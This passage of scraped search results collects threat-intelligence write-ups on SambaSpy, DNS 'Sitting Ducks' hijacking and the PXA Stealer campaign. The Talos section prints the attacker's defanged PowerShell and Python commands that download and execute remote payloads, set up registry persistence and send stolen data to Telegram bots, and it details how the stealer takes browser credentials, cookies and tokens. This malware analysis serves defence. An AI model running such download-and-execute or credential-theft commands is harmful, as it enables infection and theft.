            "The use of social engineering techniques such as phishing, coupled with multi-stage malware delivery mechanisms, demonstrates the advanced capabilities of the threat actors involved. Their use of platforms like Dropbox to host initial downloaders, along with the deployment of infostealer and clipper malware, suggests a coordinated effort to evade detection and maximize the impact of their operations.\n",
            "The similarities between different sub-campaigns and the shared infrastructure across them indicates a well-organized operation, potentially linked to a single actor or group with specific financial motives.\n",
            "The discovery of 16 inactive sub-campaigns further illustrates the dynamic and adaptable nature of the threat actor’s operations.\n",
            "You can read our report here.\n",
            "SambaSpy\n",
            "In May, we discovered a campaign exclusively targeting victims in Italy, which is quite unusual, as cybercriminals typically broaden their range of targets to maximize their profits. However, in this campaign, the attackers check at various stages of the infection chain to ensure that only people in Italy are infected.\n",
            "The final payload of the infection is a new RAT (Remote Access Trojan) called SambaSpy, a full-featured RAT developed in Java and obfuscated using the Zelix KlassMaster protector. The malware includes an extensive list of functions, including file system management, process management, keylogging, screen grabbing and webcam control.\n",
            "The attackers lure their targets with phishing emails disguised as messages from a real estate agency. If the target clicks the link in the message, they are redirected to a malicious website that checks the system language and browser. If the potential victim’s system is set to Italian and they open the link in Edge, Firefox or Chrome, they receive a malicious PDF file that infects their device with either a dropper or a downloader. The difference between the two is minimal: the dropper installs the Trojan immediately, while the downloader first downloads the necessary components from the attackers’ servers. Those who don’t meet these criteria are redirected to the website of an Italian cloud-based solution for storing and managing digital invoices.\n",
            "     SambaSpy infection chain 1 \n",
            "     SambaSpy infection chain 2 \n",
            "While we don’t yet know which cybercriminal group is behind this sophisticated attack, circumstantial evidence indicates that the attackers speak Brazilian Portuguese. We also know that they’re already expanding their operations to Spain and Brazil, as evidenced by malicious domains used by the same group in other detected campaigns.\n",
            "Highlights: ['For example, the attackers leveraged a recently discovered vulnerability in WinRAR (CVE-2023-38831) that allowed them to execute arbitrary code on a compromised system via a specially crafted archive. This approach allows the group to more effectively deliver and disguise the malicious payload. As is the case with most hacktivist groups, Head Mare maintains a public account on the X social network, which it uses to post information about some of its victims. Head Mare has targeted a variety of industries, including government, energy, transportation, manufacturing and entertainment. The group mainly uses publicly available software, which is typical of hacktivist groups.']\n",
            "Highlight Scores: [0.5451830625534058]\n",
            "Summary: None\n",
            "\n",
            "\n",
            "Title: Multiple DNS Actors linked to Domain Hijacking | Infoblox\n",
            "URL: https://blogs.infoblox.com/threat-intelligence/dns-predators-hijack-domains-to-supply-their-attack-infrastructure/\n",
            "ID: https://blogs.infoblox.com/threat-intelligence/dns-predators-hijack-domains-to-supply-their-attack-infrastructure/\n",
            "Score: 0.1382400542497635\n",
            "Published Date: 2024-11-14T00:00:00.000Z\n",
            "Author: Infoblox Threat Intel\n",
            "Image: None\n",
            "Extras None\n",
            "Subpages: None\n",
            "Text: Hijacking domains using a ‘Sitting Ducks attack’ remains an underreported topic in the cybersecurity community. Few threat researchers are familiar with this attack vector, and knowledge is scarce. However, the prevalence of these attacks and the risk to organizations are much broader than initially reported. \n",
            "Following our initial publication on Sitting Ducks, Infoblox Threat Intel delved deeper into this topic. The result is a new, eye-opening report estimating that over 1 million registered domains could be vulnerable. The report also explores the widespread use of the attack and how multiple actors leverage it to strengthen their malicious campaigns. \n",
            "More evidence found on Sitting Ducks Attacks\n",
            "During a Sitting Ducks attack, the malicious actor gains full control of the domain by taking over its DNS configurations. Cybercriminals have used this vector since 2018 to hijack tens of thousands of domain names. Victim domains include well-known brands, non-profits and government entities. Infoblox Threat Intel crafted a monitoring initiative after the initial paper on Sitting Ducks attacks was published in July 2024. The results are very sobering, as 800,000 vulnerable domains were identified, and about 70,000 of those were identified as hijacked. \n",
            "Easy to execute for actors. Hard to detect for security teams\n",
            "Sitting Ducks attacks are easy to execute. The attack takes advantage of misconfigurations in the DNS settings for a domain, specifically when the domain server points to the wrong authoritative name server. The configuration vulnerability, known as ‘lame delegation,’ is not recognized as an official CVE or by major security authorities like CISA. This lack of attention allows actors to continue flying under the radar. \n",
            "The harm doesn’t end there. Once a victim domain is compromised, it allows the actors to set up attack infrastructure capable of evading existing detections. The positive reputation of the hijacked domains enables them to be seen by security controls as safe or benign, which then allows users to connect to the compromised and weaponized site. The low technical entry barrier to execute Sitting Ducks attacks and the additional stealth in subsequent intrusion steps may attract many more cybercriminal groups, resulting in more attack instances. \n",
            "Mining and Recycling Exploitable Domains\n",
            "A common occurrence seen by Infoblox threat researchers is rotational hijacking. This means that a domain is hijacked by multiple actors over time. Threat actors often hunt exploitable service providers that offer free accounts, like DNS Made Easy as lending libraries, typically “checking out” (hijacking) domains for 30 to 60 days. Researchers have also seen cases where actors hold the domain for an extended period. After the free account expires, the domain is then ‘lost’ by the first threat actor and either parked or claimed by another threat actor. \n",
            "Vipers and Hawks Feasting on Sitting Ducks Attacks\n",
            " \n",
            " Vacant Viper \n",
            "Vacant Viper is one of the earliest known threat actors to exploit ‘Sitting Ducks’ and has hijacked an estimated 2,500 domains each year since December 2019. This actor uses hijacked domains to augment their malicious traffic distribution system (TDS) called 404TDS with the intention to run malicious spam operations, deliver porn, establish remote access trojan (RAT) C2s, and drop malware such as DarkGate and AsyncRAT. Vacant Viper does not hijack domains for a specific brand connection but instead for a set of domain resources that have high reputations and will not be blocked by security vendors. The newly published report lists examples of attack chains showing redirection techniques used both by the 404TDS and their affiliates, including how Vacant Viper uses hijacked domains in the 404TDS.\n",
            " Vextrio Viper \n",
            "This actor has used hijacked domains as part of their massive TDS infrastructure since early 2020. Vextrio runs the largest known cybercriminal affiliate program, routing compromised web traffic to over 65 affiliate partners, some of whom have also stolen domains via ‘Sitting Ducks’ for their own malicious activities. Many of these affiliates use a Russian antibot service as a method to filter out bots and security researchers. The functionality of AntiBot includes the ability to set rules to block certain bot services or users based on their IP geolocation, user-agent, etc.\n",
            "New actors Horrid Hawk and Hasty Hawk.\n",
            " \n",
            "The animal designation of Hawks was given because the threat actors swoop in and hijack vulnerable domains, much like hawks dive down to snatch their prey. Infoblox has named several new actors thriving on hijacked domains.\n",
            " \n",
            " Horrid Hawk: A DNS threat actor that has been hijacking domains and using them for investment fraud schemes since at least February 2023. This actor is interesting because they use hijacked domains in every step of their campaigns, crafting convincing lures containing non-existent government investment programs or summits. They embed the hijacked domains in short-lived Facebook ads targeting users in over 30 languages, spanning multiple continents.\n",
            " Hasty Hawk: Another threat actor discovered during our research into ‘Sitting Ducks’ hijackings. Since at least March 2022, Hasty Hawk has hijacked over 200 domains to operate widespread phishing campaigns that primarily spoof DHL shipping pages and fake donation sites to support Ukraine. The actor exploits many providers, often reconfiguring hijacked domains to host content on Russian IPs. Hasty Hawk uses Google ads and other means, such as spam messages, to distribute malicious content. They also use a TDS to route users to different webpages that vary in content and language depending on their geolocation and other user characteristics. Hasty Hawk switches some of their domains back and forth between various campaign themes.\n",
            "Havoc for individuals and businesses\n",
            "Sitting Ducks attacks make many victims. Here is a brief overview of who may be impacted by these attacks:\n",
            "Organizations or Businesses: The first victim group is the organizations or businesses that own the vulnerable domains. The hijacking impacts their brand and reputation once the compromised site hits the news. Recovering from these attacks can take a lot of time and expertise, often not readily available within the organization.\n",
            "Individuals: The second victim group is the individuals who step into the malicious content or infrastructure behind the trusted domains. One single unconscious action can result in malware downloads, credential theft or fraud, resulting in costly damages to the individual or organization to whom they belong.\n",
            "Security Teams: The last victim group is the thousands of security teams defending their organizations against the latest threats. Cybercriminals like Hawks or Vipers use thousands of trusted domains in their TDSs and attack infrastructure, reducing the efficacy of their security operations drastically. When combined with additional social engineering, Hawks or Vipers can mislead targeted users within an organization, install remote access tools, and bypass existing controls. The time and cost to recover from these incidents can reach into the millions.\n",
            "How to defend against Hawks?\n",
            "While Sitting Ducks attacks are relatively easy to perform and difficult to detect, they are also entirely preventable with correct configurations at the domain registrar and DNS providers. DNS misconfigurations are an oversight arising from many factors. Multiple parties can play a role fixing them: the domain holder owns their domain configurations, and both registrars and DNS providers can make these types of hijacks harder to perform or easier to remediate.\n",
            "Read More in Our New Research Report\n",
            "Infoblox Threat Intel experts created an extensive report intended for threat researchers and advanced security professionals. The report explains the details behind how Sitting Ducks attacks work and how to identify a compromised domain. We also explored in depth how Vipers and Hawks execute Sitting Ducks attacks to create an infrastructure resistant to security vendor detection. For detection and threat-hunting teams, we list multiple victim domains and indicators of activity. Lastly, we explain with comprehensive illustrations how to assess your risks for a Sitting Ducks attack.\n",
            "Protect your business against the latest DNS threats. Download this latest Infoblox Threat Intel research report now. \n",
            "  November 14, 2024       Infoblox Threat Intel is the leading creator of original DNS threat intelligence, distinguishing itself in a sea of aggregators. What sets us apart? Two things: mad DNS skills and unparalleled visibility. DNS is notoriously tricky to interpret and hunt from, but our deep understanding and unique access give us a backstage pass to the internet's inner workings. We're proactive, not just defensive, using our insights to disrupt cybercrime where it begins. We also believe in sharing knowledge to support the broader security community by publishing detailed research and releasing indicators on GitHub. In addition, our intel is seamlessly integrated into our Infoblox DNS Detection and Response solutions, so customers automatically get the benefits of it, along with ridiculously low false positive rates.\n",
            "Highlights: ['Here is a brief overview of who may be impacted by these attacks: Organizations or Businesses: The first victim group is the organizations or businesses that own the vulnerable domains. The hijacking impacts their brand and reputation once the compromised site hits the news. Recovering from these attacks can take a lot of time and expertise, often not readily available within the organization. Individuals: The second victim group is the individuals who step into the malicious content or infrastructure behind the trusted domains.']\n",
            "Highlight Scores: [0.5619944334030151]\n",
            "Summary: None\n",
            "\n",
            "\n",
            "Title: New PXA Stealer targets government and education sectors for sensitive information\n",
            "URL: https://blog.talosintelligence.com/new-pxa-stealer/\n",
            "ID: https://blog.talosintelligence.com/new-pxa-stealer/\n",
            "Score: 0.1372814178466797\n",
            "Published Date: 2024-11-14T00:00:00.000Z\n",
            "Author: Joey Chen\n",
            "Image: https://blog.talosintelligence.com/content/images/size/w1200/2024/11/Screenshot-2024-11-12-at-3.17.48-PM.png\n",
            "Extras None\n",
            "Subpages: None\n",
            "Text: Cisco Talos Blog\n",
            "[](https://talosintelligence.com/)\n",
            "*\n",
            "[Intelligence Center](https://talosintelligence.com/reputation)\n",
            "+\n",
            "[Intelligence Center](https://talosintelligence.com/reputation)\n",
            "+ BACK\n",
            "+ [Intelligence Search](https://talosintelligence.com/reputation_center)\n",
            "+ [Email & Spam Trends](https://talosintelligence.com/reputation_center/email_rep)\n",
            "*\n",
            "[Vulnerability Research](https://talosintelligence.com/vulnerability_info)\n",
            "+\n",
            "[Vulnerability Information](https://talosintelligence.com/vulnerability_info)\n",
            "+ BACK\n",
            "+ [Vulnerability Reports](https://talosintelligence.com/vulnerability_reports)\n",
            "+ [Microsoft Advisories](https://talosintelligence.com/ms_advisories)\n",
            "*\n",
            "[Incident Response](https://talosintelligence.com/incident_response)\n",
            "*\n",
            "[Blog](https://blog.talosintelligence.com/)\n",
            "*\n",
            "[Support](https://support.talosintelligence.com/)\n",
            "More\n",
            "* Security Resources\n",
            "Security Resources\n",
            "+ BACK\n",
            "Security Resources\n",
            "+ [Open Source Security Tools](https://talosintelligence.com/software)\n",
            "+ [Intelligence Categories Reference](https://talosintelligence.com/categories)\n",
            "+ [Secure Endpoint Naming Reference](https://talosintelligence.com/secure-endpoint-naming)\n",
            "* Media\n",
            "Media\n",
            "+ BACK\n",
            "Media\n",
            "+ [Talos Intelligence Blog](https://blog.talosintelligence.com/)\n",
            "+ [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)\n",
            "+ [Beers with Talos Podcast](https://talosintelligence.com/podcasts/shows/beers_with_talos)\n",
            "+ [Talos Takes Podcast](https://talosintelligence.com/podcasts/shows/talos_takes)\n",
            "+ [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)\n",
            "* Company\n",
            "Company\n",
            "+ BACK\n",
            "Company\n",
            "+ [About Talos](https://talosintelligence.com/about)\n",
            "+ [Careers](https://talosintelligence.com/careers)\n",
            "New PXA Stealer targets government and education sectors for sensitive information\n",
            "By [Joey Chen](https://blog.talosintelligence.com/author/joey/), [Alex Karkins](https://blog.talosintelligence.com/author/alex/), [Chetan Raghuprasad](https://blog.talosintelligence.com/author/chetan-raghuprasad/)\n",
            "Thursday, November 14, 2024 06:00\n",
            "[Threat Spotlight](https://blog.talosintelligence.com/category/threat-spotlight/) [Stealer](https://blog.talosintelligence.com/category/stealer/)\n",
            "* Cisco Talos discovered a new information stealing campaign operated by a Vietnamese-speaking threat actor targeting government and education entities in Europe and Asia.\n",
            "* We discovered a new Python program called PXA Stealer that targets victims’ sensitive information, including credentials for various online accounts, VPN and FTP clients, financial information, browser cookies, and data from gaming software.\n",
            "* PXA Stealer has the capability to decrypt the victim’s browser master password and uses it to steal the stored credentials of various online accounts.\n",
            "* The attacker has used complex obfuscation techniques for the batch scripts used in this campaign.\n",
            "* We discovered the attacker selling credentials and tools in the Telegram channel “Mua Bán Scan MINI,” which is where the [CoralRaider](https://blog.talosintelligence.com/coralraider-targets-socialmedia-accounts/) adversary operates, but we are not sure if the attacker belongs to the CoralRaider threat group or another Vietnamese cybercrime group.\n",
            "Victimology and targeted information\n",
            "The attacker is targeting the education sector in India and government organizations in European countries, including Sweden and Denmark, based on Talos telemetry data.\n",
            "The attacker’s motive is to steal the victim’s information, including credentials for various online accounts, browser login data, cookies, autofill information, credit card details, data from various cryptocurrency online and desktop wallets, data from installed VPN clients, gaming software accounts, chat messengers, password managers, and FTP clients.\n",
            "Attacker’s infrastructure\n",
            "Talos discovered that the attacker was hosting malicious scripts and the stealer program on a domain, tvdseo[.]com, in the directories “/file”, “/file/PXA/”, “/file/STC/”, and “/file/Adonis/”. The domain belongs to a Vietnamese professional search engine optimization (SEO) service provider; however, we are not certain whether the attacker has compromised the domain to host the malicious files or has subscribed to get legitimate access while still using it for their malicious purposes.\n",
            "We found that the attacker is using the Telegram bot for exfiltrating victims’ data. Our analysis of the payload, PXA Stealer, disclosed a few Telegram bot tokens and the chat IDs – controlled by the attacker.\n",
            "Attacker - controlled Telegram b ot t oken\n",
            "7545164691:AAEJ 4E2f-4KZDZrLID8hSRSJmPmR1h-a2M4\n",
            "7414494371:AAGgbY 4XAvxTWFgAYiAj6OXVJOVrqgjdGVs\n",
            "Attacker - controlled Telegram c hat ID s\n",
            "-1002174636072\n",
            "-1002150158011\n",
            "-4559798560\n",
            "-4577199885\n",
            "-4575205410\n",
            "Attacker’s underground activities\n",
            "We identified attacker’s Telegram account “Lone None,” which was hardcoded in the PXA Stealer program and analyzed various details of the account, including the icon of Vietnam’s national flag and a picture of the emblem for Vietnam’s Ministry of Public Security, which aligns with our assessment that the attacker is of Vietnamese origin. Also, we found Vietnamese comments in the PXA Stealer program, which further strengthen our assessment.\n",
            "The attacker’s Telegram account has biography data that includes a link to a private antivirus checker website that allows users or buyers to assess the detection rate of a malware program. This website provides a platform for potential threat actors to evaluate the effectiveness and stealth capabilities of the malware before purchasing it, indicating a sophisticated level of service and professionalism in the threat actor's operations.\n",
            "We also discovered that the attacker is active in an underground Telegram channel, “Mua Bán Scan MINI,” mainly selling Facebook accounts, Zalo accounts, SIM cards, credentials, and money laundry data. Talos observed that this Vietnamese actor is also seen in the Telegram group in which the CoralRaider actor operates. However, we are not certain whether the actor is a member of the CoralRaider gang or another Vietnamese cybercrime group.\n",
            "Talos discovered that the attacker is also promoting another underground Telegram channel, “Cú Black Ads – Dropship,\" by sharing a few automation tools to manage large numbers of user accounts in their channel and conducting the exchanging or selling of information related to social media accounts, proxy services, and a batch account creator tool.\n",
            "The tools shared by the attacker in the group are automated utilities designed to manage several user accounts. These tools include a Hotmail batch creation tool, an email mining tool, and a Hotmail cookie batch modification tool. The compressed packages provided by the threat actor often contain not only the executable files for these tools but also their source code, allowing users to modify them as needed.\n",
            "Hotmail batch creation tool from telegram channel.\n",
            "Hotmail cookie batch modification tool from telegram channel.\n",
            "We found that the attacker is not sharing all the tools for free, and some of them require users to send a unique key back to the Telegram channel administrator for software activation. This process ensures that only those who have been vetted or have paid for the tool can access its full functionality. We also discovered that these tools are distributed on other websites, such as aehack[.]com, highlighting that they are selling the tools. Additionally, a [YouTube](https://www.youtube.com/watch?v=nBLueYeRugg) channel exists that provides tutorials on how to use these tools, further facilitating their widespread use and demonstrating the organized efforts to market and instruct potential users on their application.\n",
            "Infection Chain\n",
            "The attacker gains initial access by sending a phishing email with a ZIP file attachment, according to our telemetry data. The ZIP file contains a malicious loader executable file compiled in Rust language and a hidden folder called Photos. The hidden folder has other recurring folders, such as Documents and Images, that contain obfuscated Windows batch scripts and a decoy PDF document.\n",
            "When a victim extracts the attachment ZIP file, the hidden folder and the malicious Rust loader executable are dropped onto the victim machine. When the malicious Rust loader executable is run by the victim, it loads and executes multiple obfuscated batch scripts that are in the dropped hidden folders.\n",
            "We deobfuscated the Windows batch scripts using [CyberChef](https://gchq.github.io/CyberChef/), with each step in the process being crucial and requiring precise execution to achieve accurate deobfuscation. First, we employed regular expressions (regex) to filter out random characters consisting of uppercase and lowercase letters (A to Z). These random strings ranged in length from six to nine characters and were enclosed within “%” symbols. Next, we filtered out the “^” symbols and removed any remaining uppercase and lowercase letters (A to Z) as well as special characters “_,” /’(?),” “$,” “#,” and “[].” Finally, we eliminated the “%” symbols and we were able to successfully deobfuscate the scripts and reveal their PowerShell commands.\n",
            "Snippet of the o bfuscated batch script Snippet of the deobfuscated batch script\n",
            "The batch scripts execute PowerShell commands simultaneously, performing the following activities on the victim machine:\n",
            "* Opens a decoy PDF document of a Glassdoor job application form.\n",
            "* Downloads a portable Python 3.10 package archive masquerading as “synaptics.zip”, which is hosted on the attacker-controlled domain through the hardcoded URL “hxxps[://]tvdseo[.]com/file/synaptics[.]zip”, and saves it in the user profile’s temporary folder as well as in the public user’s folder with the random file names and extracts them.\n",
            "C:\\WINDOWS\\system32\\cmd[.]exe /S /D /c echo [Net[.]ServicePointManager]::SecurityProtocol = [Net[.]SecurityProtocolType]::Tls12; (New-Object -TypeName System[.]Net[.]WebClient).DownloadFile('hxxps[://]tvdseo[.]com/file/synaptics[.]zip', [System[.]IO[.]Path]::GetTempPath() + 'EAnLaxUKaI[.]zip')\n",
            "C:\\WINDOWS\\system32\\cmd[.]exe /S /D /c echo [Net[.]ServicePointManager]::SecurityProtocol = [Net[.]SecurityProtocolType]::Tls12; (New-Object -TypeName System[.]Net[.]WebClient).DownloadFile('hxxps[://]tvdseo[.]com/file/synaptics[.]zip', 'C:\\Users\\Public\\oZHyMUy4qk[.]zip')\n",
            "C:\\WINDOWS\\system32\\cmd[.]exe /S /D /c echo $dst = [System[.]IO[.]Path]::Combine([System[.]Environment]::GetFolderPath('LocalApplicationData'), 'EAnLaxUKaI'); Add-Type -AssemblyName System[.]IO[.]Compression[.]FileSystem; if (Test-Path $dst) { Remove-Item -Recurse -Force $dst\\* } else { New-Item -ItemType Directory -Force $dst } ; [System[.]IO[.]Compression[.]ZipFile]::ExtractToDirectory([System[.]IO[.]Path]::Combine([System[.]IO[.]Path]::GetTempPath(), 'EAnLaxUKaI[.]zip'), $dst)\n",
            "C:\\WINDOWS\\system32\\cmd[.]exe /S /D /c echo Add-Type -AssemblyName System[.]IO[.]Compression[.]FileSystem; [System[.]IO[.]Compression[.]ZipFile]::ExtractToDirectory('C:/Users/Public/oZHyMUy4qk[.]zip', 'C:/Users/Public/oZHyMUy4qk')\n",
            "* Then, it creates and runs a Windows shortcut file with the file name “WindowsSecurity.lnk”, configuring a base64-encoded command as a command line argument in the user profile’s temporary folder and configures the “Run” registry key with the path of the shortcut file to establish persistence.\n",
            "C:\\WINDOWS\\system32\\cmd[.]exe /S /D /c echo $s = $payload = import base64;exec(base64.b64decode('aW1wb3J0IHVybGxpYi5yZXF1ZXN0O2ltcG9ydCBiYXNlNjQ7ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHBzOi8vdHZkc2VvLmNvbS9maWxlL1BYQS9QWEFfUFVSRV9FTkMnKS5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpKSk='));$obj = New-Object -ComObject WScript.Shell;$link = $obj.CreateShortcut($env:LOCALAPPDATA\\WindowsSecurity.lnk);$link.WindowStyle = 7;$link.TargetPath = $env:LOCALAPPDATA\\EAnLaxUKaI\\synaptics.exe;$link.IconLocation = C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe,13;$link.Arguments = -c `$payload`\";$link.Save()\n",
            "C:\\WINDOWS\\system32\\cmd[.]exe /S /D /c echo New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Windows Security' -PropertyType String -Value 'C:\\Windows\\Explorer.EXE C:\\Users\\Marsi\\AppData\\Local\\WindowsSecurity.lnk' -Force\n",
            "* The Windows shortcut file with a single-line Python script using a disguised portable Python executable downloads a base64-encoded Python program from a remote server. The downloaded program contains instructions to disable the antivirus programs on the victim’s machine.\n",
            "cmd[.]exe /c start \"\" /min C:\\Users\\Public\\oZHyMUy4qk\\synaptics[.]exe -c \"import urllib[.]request;import base64;exec(base64.b64decode(urllib[.]request[.]urlopen('hxxps[://]tvdseo[.]com/file/PXA/PXA_PURE_ENC')[.]read()[.]decode('utf-8')))\"\n",
            "* Next, the batch script continues to execute another PowerShell command that downloads the PXA Stealer Python program and executes it with the masqueraded portable Python executable “synaptics.exe” on the victim’s machine.\n",
            "cmd[.]exe /c start /min C:\\Users\\Public\\oZHyMUy4qk\\synaptics[.]exe -c import urllib[.]request;import base64;exec(base64.b64decode(urllib[.]request[.]urlopen('hxxps[://]tvdseo[.]com/file/PXA/PXA_BOT')[.]read()[.]decode('utf-8')))\n",
            "* Another batch script called “WindowsSecurity.bat” is dropped in the Windows startup folder of the victim’s machine to establish persistence, which has the command to download and execute the PXA Stealer Python program shown in the earlier paragraph.\n",
            "PXA Stealer targets victims’ sensitive data\n",
            "PXA Stealer is a Python program that has extensive capabilities targeting a variety of data on the victim’s machine.\n",
            "When the PXA Stealer is executed, it kills a variety of processes from a hardcoded list, including endpoint detection software, network capture and analysis process, VPN software, cryptocurrency wallet applications, file transfer client applications, and web browser and instant messaging application processes by executing “task kill” commands.\n",
            "Detection evasive function of PXA Stealer.\n",
            "The stealer has the capability of decrypting the browser master key, which is a cryptographic key used by web browsers like Google Chrome and other Chromium-based browsers to protect sensitive information, including stored passwords, cookies, and other data in an encrypted form on the local system. The stealer accesses the master key file “Local State” located in the browser folder of the user’s profile directory, which contains the information of the encryption key used to encrypt the user data stored in the “Login Data” file, and decrypts it using the “CryptUnprotectData” function. This allows the attacker to gain access to the stored credentials and other sensitive browser information.\n",
            "Browser master key decryption function of PXA Stealer.\n",
            "The stealer also attempts to decrypts the master key that is stored in the key4.db file. Key4.db is a database used by Firefox (and some other Mozilla-based browsers) to store encryption keys, particularly the master key that encrypts sensitive data, such as saved passwords. The “getKey” function of the stealer is designed to extract and decrypt keys from the key4.db file using either AES or 3DES encryption methods, depending on the encryption used in the stored key.\n",
            "Browser master key decryption function of PXA Stealer.\n",
            "The stealer attempts to retrieve user profiles paths from the profiles.ini file of browser applications, including Mozilla Firefox, Pale Moon, SeaMonkey, Waterfox, Mercury, k-Melon, IceDragon, Cyberfox, and BlackHaw for further processing, such as extracting saved passwords or other user data.\n",
            "The stealer collects the victim’s login information from the browser’s login data file. The function “get_ch_login_data” of the stealer extracts login data, including URLs, usernames, and passwords, from the database “login_db”, which stores login information. The extracted login information is formatted into a string that includes the URL, username, decrypted password, browser, and profile.\n",
            "For each login entry in the browser login database, the function checks if the URL contains any important keywords that are hardcoded in the stealer program, and if a match is found, the login information is saved in a separate file named “Important_Logins.txt” located in the “Browsers Data” folder within the user’s profile temporary directory. The function saves all the results to “All_Passwords.txt” in the “Browsers Data” folder for other login data found in the database.\n",
            "Login credentials stealer function of PXA Stealer.\n",
            "The stealer executes another function, “get_ch_cookies”, to extract cookies from a specified browser's cookie database, decrypt them, and save the results to a file. First, it checks if the cookies database file exists in the specified profile directory and unlocks the cookies database file. The database file is then copied to the temporary folder and is processed by executing an SQL query to retrieve cookie information, including host key, name, path, encrypted value, expiration time, secure flag, and HTTP-only flag from the cookies database file.\n",
            "If any Facebook cookies are found, they are concatenated to a single string called \"fb_formatted\", and it calls another function, \"ADS_Checker()\", to check for ads based on the Facebook cookies, and the results are written to a file called \"Facebook_Cookies.txt”. Any other cookie information is written to a text file named after the browser and the profile. Finally, the function removes the temporary cookie database file.\n",
            "Browser cookies stealer function of PXA Stealer.\n",
            "In another sample of the stealer, for the browsers Chrome, Chrome SxS, and Chrome(x86), it downloads and executes a cookie stealer JavaScript through the URL hxxps://tvdseo[.]com/file/PXA/Cookie_Ext.zip. The cookie stealer JavaScript connects to the Telegram bot with the token, and the chat ID hardcoded in the script collects the cookies and sends them to the attacker’s Telegram bot through the POST method.\n",
            "Browser cookie stealer JavaScript.\n",
            "Next, the stealer targets the victim’s credit card information stored in the browser database “webappsstore.sqlite”. The function extracts and decrypts saved credit card information from a browser's web data database. It checks if the cards database file \"cards_db\" exists and copies them to the user’s profile temporary folder. It executes a SQL query to retrieve credit card information including name on card, expiration month/year, encrypted card number, and date modified. Then it decrypts the encrypted card number using the function “decrypt_ch_value” with the help of the decrypted master key. It writes the cards’ information to a text file and names it after the browser and the profile. Finally, it gets the count of credit card information that was found and deletes the temporary copy of the “cards_db” file.\n",
            "Credit card data stealer function of PXA Stealer.\n",
            "The stealer extracts and saves the autofill form data from a browser's database to a text file with the file name format of “$browser_$profile.txt” in a folder called “AutoFills” in browser profile location.\n",
            "Autofill data stealer function of PXA Stealer.\n",
            "The stealer also extracts and validates Discord tokens stored in various browsers or Discord applications. It checks for the stored encrypted Discord tokens in the different browser database files and also Discord-specific applications files of Discord, Discord Canary, Lightcord, and Discord PTB on the victim's machine by searching for strings using regular expression \"r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\")\". Once the encrypted tokens are found, it decrypts them with the function “decrypt_dc_tokens()” using the extracted master key that was used to encrypt the tokens from the \"Local State\" file. Then, it validates the decrypted Discord tokens to check if it is a legitimate Discord token and stores it by associating it with the browser name. Besides searching for the encrypted tokens, the function also looks for unencrypted Discord tokens by searching strings that match the regular expression pattern \"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\" for standard tokens and \"mfa\\.[\\w-]{84}\" for multi-factor authentication (MFA) tokens in \".log\" and \".ldb\" files in the levelDB directory of Discord applications or web browsers where the structured key-value data is stored in levelDB database format.\n",
            "Discord token stealer function of PXA Stealer.\n",
            "The stealer executes another function to extract the user information from the MinSoftware application database. It searches for the database file \"db_maxcare.sqlite\" file on the victim machine folders, including Desktop, Documents, Downloads, OneDrive and in the logical partitions with the drive letters \"D:\\\" and \"E:\\\". Once found, it executes a SQL query to search in the accounts table of the database file and extracts the following data:\n",
            "* uid: User identifier.\n",
            "* pass: User's password.\n",
            "* fa2: Two-factor authentication data.\n",
            "* email: The user's email address.\n",
            "* passmail: The email password.\n",
            "* cookie1: Likely a session or authentication cookie.\n",
            "* token: Likely an authentication token.\n",
            "* info: Account information.\n",
            "MinSoftware application data stealer function of PXA Stealer.\n",
            "The stealer also has the functionalities for interacting with Facebook Ads Manager and Graph API using a session authenticated via cookies.\n",
            "* It takes a Facebook cookie and parses it for the session information, such as “c_user”, and attempts to access the token.\n",
            "* Retrieves and formats the details about the user's ad accounts, such as account status, currency, balance, spend cap, and amount spent.\n",
            "* Gets the list of the user's Facebook pages, including page name, link, likes, followers, and verification status.\n",
            "* It retrieves a list of groups with administrative users.\n",
            "* It extracts Business Manager IDs associated with the account and retrieves ad account information under each Business Manager.\n",
            "* It uses Facebook data to determine ad account limits for a Business Manager.\n",
            "* It extracts the token from Facebook mobile pages to facilitate authenticates requests.\n",
            "Facebook data stealer function of PXA Stealer.\n",
            "After collecting the targeted victim's data, including the login data, browser cookies, autofill information, credit card details, Facebook ads account data, cryptocurrency wallet data, Discord token details, and MinSoft application data, the stealer creates a ZIP archive of all the files in the user profile’s temporary folder with the file name format \"CountryCode_Victim's public IP Computername.zip\", with a high compression level of value nine.\n",
            "While creating the archive and navigating the targeted folders, the stealer excludes some of the directories, including user_data, emoji, tdummy, dumps, webview, update-cache, GPUCache, DawnCache, temp, Code Cache, and Cache. It also attempts to rename each file while adding them to the archive. The archive is exfiltrated to the actor’s Telegram bot. After exfiltrating the victim’s data, the stealer deletes the folders that contained the collected user data.\n",
            "Exfiltration function of PXA Stealer.\n",
            "Coverage\n",
            "[Cisco Secure Endpoint](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html) (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free [here.](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/free-trial.html?utm_campaign=amp-free-trial&utm_content=amp-free-trial&utm_medium=web-referral%3Futm_source%3Dcisco&utm_term=pgm-talos-trial)\n",
            "[Cisco Secure Web Appliance](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html) web scanning prevents access to malicious websites and detects malware used in these attacks.\n",
            "[Cisco Secure Email](https://www.cisco.com/c/en/us/products/security/email-security/index.html) (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free [here](https://www.cisco.com/c/en/us/products/security/cloud-mailbox-defense?utm_campaign=cmd-free-trial-request&utm_medium=web-referral&utm_source=cisco&utm_term=pgm-talos-trial).\n",
